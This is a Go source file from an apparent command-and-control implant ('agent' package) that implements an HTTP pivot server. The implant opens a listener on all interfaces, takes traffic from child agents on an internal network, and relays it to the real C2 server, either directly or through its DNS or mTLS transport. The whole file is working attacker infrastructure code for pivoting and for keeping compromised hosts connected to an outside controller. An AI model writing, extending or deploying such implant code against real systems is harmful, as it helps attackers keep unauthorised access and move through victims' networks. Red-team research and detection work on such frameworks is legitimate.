package agent

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sync"
	"time"
)

// httpPivotServer is an HTTP reverse proxy embedded in the agent.
// Child agents configured with serverURL=http://PIVOT_IP:PORT connect here;
// every request is relayed onward to the real C2.
type httpPivotServer struct {
	srv  *http.Server
	c2   *http.Client // direct HTTP client to the real C2
	base string       // ServerURL of the real C2
}

var (
	globalHTTPPivot   *httpPivotServer
	globalHTTPPivotMu sync.Mutex
)

// startHTTPPivot starts the HTTP pivot listener on the given port.
// Returns an error if a pivot is already running.
func startHTTPPivot(port int) error {
	globalHTTPPivotMu.Lock()
	defer globalHTTPPivotMu.Unlock()

	if globalHTTPPivot != nil {
		return fmt.Errorf("http pivot already running")
	}

	// Build an HTTP client for direct requests to the real C2.
	// Honour the agent's proxy configuration if set.
	tr := &http.Transport{}
	if ProxyURL != "" {
		if pu, err := url.Parse(ProxyURL); err == nil {
			tr.Proxy = http.ProxyURL(pu)
		}
	}
	c2Client := &http.Client{
		Transport: tr,
		Timeout:   60 * time.Second,
	}

	ps := &httpPivotServer{
		c2:   c2Client,
		base: ServerURL,
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", ps.relay)

	ps.srv = &http.Server{
		Addr:    fmt.Sprintf("0.0.0.0:%d", port),
		Handler: mux,
	}

	globalHTTPPivot = ps

	go func() {
		if err := ps.srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			globalHTTPPivotMu.Lock()
			if globalHTTPPivot == ps {
				globalHTTPPivot = nil
			}
			globalHTTPPivotMu.Unlock()
		}
	}()

	return nil
}

// stopHTTPPivot shuts down the running pivot server and returns a status string.
func stopHTTPPivot() string {
	globalHTTPPivotMu.Lock()
	ps := globalHTTPPivot
	globalHTTPPivot = nil
	globalHTTPPivotMu.Unlock()

	if ps == nil {
		return "http pivot not running"
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	if err := ps.srv.Shutdown(ctx); err != nil {
		return fmt.Sprintf("http pivot shutdown error: %v", err)
	}
	return "http pivot stopped"
}

// relay proxies an incoming request from a child agent to the real C2.
func (ps *httpPivotServer) relay(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read body: "+err.Error(), http.StatusBadGateway)
		return
	}
	r.Body.Close()

	method := r.Method
	path := r.RequestURI // includes query string

	// If the active transport supports raw forwarding, delegate to it.
	// This allows encrypted transports (DNS, mTLS, etc.) to relay traffic
	// through their own channel rather than a plain HTTP connection.
	if rf, ok := activeTransport.(rawForwarder); ok {
		status, respBody, err := rf.rawForward(method, path, body)
		if err != nil {
			http.Error(w, "raw forward: "+err.Error(), http.StatusBadGateway)
			return
		}
		if status == http.StatusNoContent {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		w.WriteHeader(status)
		w.Write(respBody)
		return
	}

	// Fall back to a direct HTTP request to the real C2.
	upstream, err := http.NewRequestWithContext(r.Context(), method,
		ps.base+path, bytes.NewReader(body))
	if err != nil {
		http.Error(w, "build request: "+err.Error(), http.StatusBadGateway)
		return
	}

	// Propagate Content-Type from the child agent's request.
	if ct := r.Header.Get("Content-Type"); ct != "" {
		upstream.Header.Set("Content-Type", ct)
	}

	resp, err := ps.c2.Do(upstream)
	if err != nil {
		http.Error(w, "upstream: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		http.Error(w, "read upstream body: "+err.Error(), http.StatusBadGateway)
		return
	}

	if ct := resp.Header.Get("Content-Type"); ct != "" {
		w.Header().Set("Content-Type", ct)
	}
	w.WriteHeader(resp.StatusCode)
	w.Write(respBody)
}

